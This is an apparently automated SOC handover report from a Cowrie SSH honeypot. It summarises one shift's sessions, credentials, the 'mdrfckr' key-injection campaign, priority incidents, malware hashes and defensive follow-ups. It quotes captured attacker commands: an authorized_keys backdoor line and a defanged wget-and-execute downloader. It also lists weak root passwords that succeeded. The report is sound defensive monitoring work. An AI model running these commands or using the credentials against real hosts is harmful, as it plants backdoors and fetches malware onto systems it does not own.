# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-27 |
| **Generated At** | 2026-03-27T05:41:54Z |
| **Shift Time** | 05:41 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **52** |
| Confirmed Threats | **43** |
| False Positives Filtered | **9** (17.3%) |
| Unique Attacker IPs | **39** |
| Countries of Origin | **16** |
| High Severity Cases | **8** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **44** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **30** |
| Unique Credential Pairs | **26** |
| Unique Usernames | **17** |
| Unique Passwords | **25** |
| Successful Auth Pairs | **8** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 8 |
| `admin` | 3 |
| `345gs5662d34` | 3 |
| `support` | 2 |
| `administrator` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 3 |
| `3245gs5662d34` | 3 |
| `qwerty12345` | 2 |
| `Host: 13.235.92.17:23` | 1 |
| `Accept: */*` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 3 |
| `root` | `3245gs5662d34` | 3 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 1 |
| `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36` | `Accept: */*` | 1 |
| `Accept-Encoding: gzip` | `` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `vizxv` | `64.89.163.118` | 2026-03-27T02:50:19 |
| `root` | `windows@123` | `186.19.136.61` | 2026-03-27T04:03:03 |
| `root` | `3245gs5662d34` | `186.19.136.61` | 2026-03-27T04:03:11 |
| `root` | `Passw0rd` | `49.124.148.195` | 2026-03-27T04:41:09 |
| `root` | `Aa456789` | `47.91.107.22` | 2026-03-27T04:49:26 |
| `root` | `3245gs5662d34` | `47.91.107.22` | 2026-03-27T04:49:28 |
| `root` | `wangtao520` | `109.195.108.173` | 2026-03-27T05:26:04 |
| `root` | `3245gs5662d34` | `109.195.108.173` | 2026-03-27T05:26:08 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `186.19.136.61`, `47.91.107.22`, `109.195.108.173`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **39** |
| Unique ASNs | **30** |
| High-Risk ASNs | **24** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 5 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS7922` | Comcast Cable Communications, LLC | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 1 | HIGH |
| `AS25513` | PJSC Moscow city telephone network | 1 | HIGH |
| `AS17816` | China Unicom IP network China169 Guangdong province | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (8)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-76a6630b69ca

| Field | Detail |
|---|---|
| **Source IP** | `64.89.163[.]118` |
| **First Seen** | 2026-03-27 02:50 |
| **Last Seen** | 2026-03-27 02:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://64.89.163[.]118/cat.sh; chmod 777 cat.sh; sh cat.sh; rm -f cat.sh *` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 02:50:19` | `cowrie.session.connect` |
| `2026-03-27 02:50:19` | `cowrie.login.success` |
| `2026-03-27 02:50:19` | `cowrie.session.params` |
| `2026-03-27 02:50:20` | `cowrie.command.input` |
| `2026-03-27 02:50:20` | `cowrie.log.closed` |
| `2026-03-27 02:50:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.163[.]118` to AbuseIPDB if not already reported
- [ ] Block `64.89.163[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1795cdd94b18

| Field | Detail |
|---|---|
| **Source IP** | `186.19.136[.]61` |
| **First Seen** | 2026-03-27 04:03 |
| **Last Seen** | 2026-03-27 04:03 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 04:03:01` | `cowrie.session.connect` |
| `2026-03-27 04:03:01` | `cowrie.client.version` |
| `2026-03-27 04:03:02` | `cowrie.client.kex` |
| `2026-03-27 04:03:03` | `cowrie.login.success` |
| `2026-03-27 04:03:04` | `cowrie.session.params` |
| `2026-03-27 04:03:04` | `cowrie.command.input` |
| `2026-03-27 04:03:04` | `cowrie.command.failed` |
| `2026-03-27 04:03:04` | `cowrie.log.closed` |
| `2026-03-27 04:03:05` | `cowrie.session.params` |
| `2026-03-27 04:03:05` | `cowrie.command.input` |
| `2026-03-27 04:03:06` | `cowrie.session.file_download` |
| `2026-03-27 04:03:06` | `cowrie.log.closed` |
| `2026-03-27 04:03:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.19.136[.]61` to AbuseIPDB if not already reported
- [ ] Block `186.19.136[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d2b8830eed4

| Field | Detail |
|---|---|
| **Source IP** | `186.19.136[.]61` |
| **First Seen** | 2026-03-27 04:03 |
| **Last Seen** | 2026-03-27 04:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 04:03:09` | `cowrie.session.connect` |
| `2026-03-27 04:03:09` | `cowrie.client.version` |
| `2026-03-27 04:03:10` | `cowrie.client.kex` |
| `2026-03-27 04:03:11` | `cowrie.login.success` |
| `2026-03-27 04:03:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.19.136[.]61` to AbuseIPDB if not already reported
- [ ] Block `186.19.136[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46368065a683

| Field | Detail |
|---|---|
| **Source IP** | `49.124.148[.]195` |
| **First Seen** | 2026-03-27 04:41 |
| **Last Seen** | 2026-03-27 04:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 04:41:08` | `cowrie.session.connect` |
| `2026-03-27 04:41:08` | `cowrie.client.version` |
| `2026-03-27 04:41:08` | `cowrie.client.kex` |
| `2026-03-27 04:41:09` | `cowrie.login.success` |
| `2026-03-27 04:41:10` | `cowrie.direct-tcpip.request` |
| `2026-03-27 04:41:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.148[.]195` to AbuseIPDB if not already reported
- [ ] Block `49.124.148[.]195` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bd3dc72cfff

| Field | Detail |
|---|---|
| **Source IP** | `47.91.107[.]22` |
| **First Seen** | 2026-03-27 04:49 |
| **Last Seen** | 2026-03-27 04:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 04:49:26` | `cowrie.session.connect` |
| `2026-03-27 04:49:26` | `cowrie.client.version` |
| `2026-03-27 04:49:26` | `cowrie.client.kex` |
| `2026-03-27 04:49:26` | `cowrie.login.success` |
| `2026-03-27 04:49:26` | `cowrie.session.params` |
| `2026-03-27 04:49:26` | `cowrie.command.input` |
| `2026-03-27 04:49:26` | `cowrie.command.failed` |
| `2026-03-27 04:49:26` | `cowrie.log.closed` |
| `2026-03-27 04:49:27` | `cowrie.session.params` |
| `2026-03-27 04:49:27` | `cowrie.command.input` |
| `2026-03-27 04:49:27` | `cowrie.session.file_download` |
| `2026-03-27 04:49:27` | `cowrie.log.closed` |
| `2026-03-27 04:49:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.91.107[.]22` to AbuseIPDB if not already reported
- [ ] Block `47.91.107[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0959de91cbb

| Field | Detail |
|---|---|
| **Source IP** | `47.91.107[.]22` |
| **First Seen** | 2026-03-27 04:49 |
| **Last Seen** | 2026-03-27 04:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 04:49:28` | `cowrie.session.connect` |
| `2026-03-27 04:49:28` | `cowrie.client.version` |
| `2026-03-27 04:49:28` | `cowrie.client.kex` |
| `2026-03-27 04:49:28` | `cowrie.login.success` |
| `2026-03-27 04:49:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.91.107[.]22` to AbuseIPDB if not already reported
- [ ] Block `47.91.107[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72fef5cbdd9a

| Field | Detail |
|---|---|
| **Source IP** | `109.195.108[.]173` |
| **First Seen** | 2026-03-27 05:26 |
| **Last Seen** | 2026-03-27 05:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 05:26:03` | `cowrie.session.connect` |
| `2026-03-27 05:26:03` | `cowrie.client.version` |
| `2026-03-27 05:26:03` | `cowrie.client.kex` |
| `2026-03-27 05:26:04` | `cowrie.login.success` |
| `2026-03-27 05:26:04` | `cowrie.session.params` |
| `2026-03-27 05:26:04` | `cowrie.command.input` |
| `2026-03-27 05:26:04` | `cowrie.command.failed` |
| `2026-03-27 05:26:04` | `cowrie.log.closed` |
| `2026-03-27 05:26:05` | `cowrie.session.params` |
| `2026-03-27 05:26:05` | `cowrie.command.input` |
| `2026-03-27 05:26:05` | `cowrie.session.file_download` |
| `2026-03-27 05:26:05` | `cowrie.log.closed` |
| `2026-03-27 05:26:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.195.108[.]173` to AbuseIPDB if not already reported
- [ ] Block `109.195.108[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f0529136eb8

| Field | Detail |
|---|---|
| **Source IP** | `109.195.108[.]173` |
| **First Seen** | 2026-03-27 05:26 |
| **Last Seen** | 2026-03-27 05:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 05:26:07` | `cowrie.session.connect` |
| `2026-03-27 05:26:07` | `cowrie.client.version` |
| `2026-03-27 05:26:08` | `cowrie.client.kex` |
| `2026-03-27 05:26:08` | `cowrie.login.success` |
| `2026-03-27 05:26:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.195.108[.]173` to AbuseIPDB if not already reported
- [ ] Block `109.195.108[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `3.131.220[.]121` | **5** | 2026-03-27 04:01 | 2026-03-27 04:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `1.30.20[.]238` | 1 | 2026-03-27 03:56 | 2026-03-27 03:56 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.90.34[.]90` | 1 | 2026-03-27 04:58 | 2026-03-27 05:00 | 120s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.3.43[.]242` | 1 | 2026-03-27 05:17 | 2026-03-27 05:18 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.67.152[.]201` | 1 | 2026-03-27 04:16 | 2026-03-27 04:16 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `109.195.108[.]173` | 1 | 2026-03-27 05:26 | 2026-03-27 05:26 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.94.5[.]43` | 1 | 2026-03-27 02:54 | 2026-03-27 02:54 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.233.44[.]129` | 1 | 2026-03-27 03:49 | 2026-03-27 03:49 | 14s | 0 | `T1592` | 🟢 LOW |
| `121.66.124[.]146` | 1 | 2026-03-27 03:56 | 2026-03-27 03:56 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `175.198.18[.]3` | 1 | 2026-03-27 05:22 | 2026-03-27 05:22 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.154[.]91` | 1 | 2026-03-27 02:16 | 2026-03-27 02:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `186.19.136[.]61` | 1 | 2026-03-27 04:03 | 2026-03-27 04:03 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `2.55.64[.]191` | 1 | 2026-03-27 02:37 | 2026-03-27 02:37 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `213.55.79[.]195` | 1 | 2026-03-27 02:34 | 2026-03-27 02:34 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `27.39.130[.]144` | 1 | 2026-03-27 03:35 | 2026-03-27 03:35 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `39.164.91[.]67` | 1 | 2026-03-27 04:38 | 2026-03-27 04:38 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `42.177.189[.]185` | 1 | 2026-03-27 05:32 | 2026-03-27 05:32 | 13s | 0 | `T1592` | 🟢 LOW |
| `47.91.107[.]22` | 1 | 2026-03-27 04:49 | 2026-03-27 04:49 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.152[.]220` | 1 | 2026-03-27 02:37 | 2026-03-27 02:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.152[.]247` | 1 | 2026-03-27 03:36 | 2026-03-27 03:36 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.152[.]5` | 1 | 2026-03-27 03:39 | 2026-03-27 03:39 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.153[.]58` | 1 | 2026-03-27 03:15 | 2026-03-27 03:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-03-27 05:23 | 2026-03-27 05:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `51.14.67[.]26` | 1 | 2026-03-27 04:42 | 2026-03-27 04:42 | 14s | 0 | `T1592` | 🟢 LOW |
| `51.143.126[.]211` | 1 | 2026-03-27 02:37 | 2026-03-27 02:37 | 30s | 0 | `T1592` | 🟢 LOW |
| `59.144.228[.]132` | 1 | 2026-03-27 04:32 | 2026-03-27 04:33 | 31s | 0 | `T1592` | 🟢 LOW |
| `64.89.163[.]118` | 1 | 2026-03-27 02:50 | 2026-03-27 02:50 | 0s | 1 | `T1110.001` | 🟢 LOW |
| `73.72.115[.]182` | 1 | 2026-03-27 02:30 | 2026-03-27 02:30 | 30s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]222` | 1 | 2026-03-27 02:23 | 2026-03-27 02:23 | 0s | 3 | `T1110.001` | 🟢 LOW |
| `95.165.142[.]8` | 1 | 2026-03-27 02:34 | 2026-03-27 02:34 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `96.69.42[.]141` | 1 | 2026-03-27 04:17 | 2026-03-27 04:17 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `59.144.228[.]132` | IN | Infrastructer | **100** ⚠️ | 0 |
| `42.177.189[.]185` | CN | UNICOM Liaoning Province Network | **100** ⚠️ | 1 |
| `51.143.126[.]211` | US | Microsoft Limited | **100** ⚠️ | 2 |
| `121.66.124[.]146` | KR | LG Uplus | **100** ⚠️ | 43 |
| `73.72.115[.]182` | US | Comcast IP Services, L.L.C. | **100** ⚠️ | 26 |
| `49.124.153[.]58` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 9 |
| `49.88.156[.]34` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `118.233.44[.]129` | TW | kbro CO. Ltd. | **100** ⚠️ | 10 |
| `49.124.148[.]195` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 7 |
| `49.124.152[.]220` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 13 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 31 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 20 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 8 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |

---

## 🔕 False Positive Summary (9 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 52 cases |
| Tool 34  | Credential Extractor        | ✅ 30 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 39 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 9 filtered (17.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 30 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 8 priority case(s) shown individually · 31 recon entry/entries in table (1 group(s) consolidating 5 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-27T05:41:54Z_
